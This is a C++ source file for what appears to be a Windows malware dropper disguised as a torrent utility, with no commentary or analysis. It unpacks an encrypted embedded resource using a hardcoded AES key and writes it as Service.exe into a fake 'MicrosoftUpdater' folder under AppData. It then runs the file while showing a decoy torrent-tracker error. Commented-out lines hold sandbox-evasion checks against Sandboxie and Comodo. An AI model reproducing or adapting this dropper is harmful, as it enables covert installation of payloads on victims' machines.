#include "pch.h"
#include <windows.h>
#include <fstream>
#include <Shellapi.h>
#include <wincrypt.h>
#include <Shlobj.h>
#include <Userenv.h>
#include <Tlhelp32.h>

#pragma comment (lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "Advapi32.lib")

#define BLOCK_LEN 128


void ExtractBinResource(std::string strCustomResName, int nResourceId, std::string strOutputName);
int DeCrypt(LPCWSTR inFilename, LPCWSTR outFilename, LPCWSTR key_str);
wchar_t *convertCharArrayToLPCWSTR(const char* charArray);
bool isDirectoryExists(const char *filename);
bool checkLoadedDll(char * dllName);
DWORD getPIDproc(char * pProcName);

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR  lpCmdLine, int nCmdShow)
{
	HANDLE mutex;
	mutex = CreateMutex(NULL, TRUE, "torrent");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{

		//if (getPIDproc((char*)"cmdvirth.exe") || getPIDproc((char*)"SbieSvc.exe")) exit(0);
		//if (checkLoadedDll((wchar_t*)"cmdvrt64.dll") || checkLoadedDll((wchar_t*)"sbiedll.dll"))exit(0);

		TCHAR* szPath = new TCHAR[MAX_PATH];
		std::string filePath = "Service.exe";
		std::string dirPath;
		if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, szPath)))
		{
			dirPath = szPath;
			dirPath = dirPath + "\\MicrosoftUpdater";
			if (!isDirectoryExists(dirPath.c_str()))
				CreateDirectoryW(convertCharArrayToLPCWSTR(dirPath.c_str()), NULL);

			filePath = dirPath + "\\" + filePath;
		}

		ExtractBinResource("File", 102, dirPath + "\\data.bin");
		DeCrypt(convertCharArrayToLPCWSTR((dirPath + "\\data.bin").c_str()), convertCharArrayToLPCWSTR(filePath.c_str()), L"9lgcThRdWq96m3MHmTAiv1");

		STARTUPINFO info = { sizeof(info) };
		PROCESS_INFORMATION processInfo;
		CreateProcess(filePath.c_str(), const_cast<LPSTR>("code Hosting"), NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);

		MessageBox(NULL, "The selected torrent tracker is not suitable for downloads by default.", "Error", MB_ICONERROR | MB_OK);
	}
	else
	{
		char name[MAX_PATH];
		GetModuleFileName(NULL, name, MAX_PATH);
		STARTUPINFO info = { sizeof(info) };
		PROCESS_INFORMATION processInfo;
		CreateProcess(name, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo);
		Sleep(100);
	}
}

bool checkLoadedDll(char * dllName)
{
	HMODULE hDll = GetModuleHandle(dllName);
	if (hDll) return TRUE;
}

DWORD getPIDproc(char * pProcName)
{
	HANDLE pHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (pHandle == NULL) return 0;

	PROCESSENTRY32 ProcessEntry;
	DWORD pid;
	ProcessEntry.dwSize = sizeof(ProcessEntry);
	bool Loop = Process32First(pHandle, &ProcessEntry);

	if (Loop == NULL) return 0;

	while (Loop)
	{
		if (strstr((const char*)ProcessEntry.szExeFile, pProcName))
		{
			pid = ProcessEntry.th32ProcessID;
			CloseHandle(pHandle);
			return pid;
		}
		Loop = Process32Next(pHandle, &ProcessEntry);
	}
	return 0;
}

bool isDirectoryExists(const char *filename)
{
	DWORD dwFileAttributes = GetFileAttributes(filename);
	if (dwFileAttributes == 0xFFFFFFFF)
		return false;
	return dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;
}

wchar_t *convertCharArrayToLPCWSTR(const char* charArray)
{
	wchar_t* wString = new wchar_t[4096];
	MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
	return wString;
}

void ExtractBinResource(std::string strCustomResName, int nResourceId, std::string strOutputFile)
{
	HGLOBAL hResourceLoaded; // handle to loaded resource 
	HRSRC hRes; // handle/ptr to res. info. 
	char *lpResLock; // pointer to resource data 
	DWORD dwSizeRes;

	hRes = FindResource(NULL, MAKEINTRESOURCE(nResourceId), strCustomResName.c_str());
	hResourceLoaded = LoadResource(NULL, hRes);
	lpResLock = (char *)LockResource(hResourceLoaded);
	dwSizeRes = SizeofResource(NULL, hRes);
	std::ofstream outputFile(strOutputFile.c_str(), std::ios::binary);
	outputFile.write((const char *)lpResLock, dwSizeRes);
	outputFile.close();
}
int DeCrypt(LPCWSTR inFilename, LPCWSTR outFilename, LPCWSTR key_str)
{

	size_t len = lstrlenW(key_str);

	HANDLE hInpFile = CreateFileW(inFilename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (hInpFile == INVALID_HANDLE_VALUE)
	{
		return (-1);
	}
	HANDLE hOutFile = CreateFileW(outFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hOutFile == INVALID_HANDLE_VALUE)
	{
		return (-1);
	}

	DWORD dwStatus = 0;
	BOOL bResult = FALSE;
	wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
	HCRYPTPROV hProv;
	if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		dwStatus = GetLastError();
		CryptReleaseContext(hProv, 0);
		return dwStatus;
	}
	HCRYPTHASH hHash;
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
	{
		dwStatus = GetLastError();
		CryptReleaseContext(hProv, 0);
		return dwStatus;
	}

	if (!CryptHashData(hHash, (BYTE*)key_str, len, 0))
	{
		DWORD err = GetLastError();
		return (-1);
	}

	HCRYPTKEY hKey;
	if (!CryptDeriveKey(hProv, CALG_AES_128, hHash, 0, &hKey))
	{
		dwStatus = GetLastError();
		CryptReleaseContext(hProv, 0);
		return dwStatus;
	}

	const size_t chunk_size = BLOCK_LEN;
	BYTE chunk[chunk_size] = { 0 };
	DWORD out_len = 0;

	BOOL isFinal = FALSE;
	DWORD readTotalSize = 0;

	DWORD inputSize = GetFileSize(hInpFile, NULL);

	while (bResult = ReadFile(hInpFile, chunk, chunk_size, &out_len, NULL)) {
		if (0 == out_len) {
			break;
		}
		readTotalSize += out_len;
		if (readTotalSize == inputSize) {
			isFinal = TRUE;
		}

		if (!CryptDecrypt(hKey, NULL, isFinal, 0, chunk, &out_len)) {
			break;
		}

		DWORD written = 0;
		if (!WriteFile(hOutFile, chunk, out_len, &written, NULL)) {
			break;
		}
		memset(chunk, 0, chunk_size);
	}

	CryptReleaseContext(hProv, 0);
	CryptDestroyKey(hKey);
	CryptDestroyHash(hHash);

	CloseHandle(hInpFile);
	CloseHandle(hOutFile);
	return 0;
}
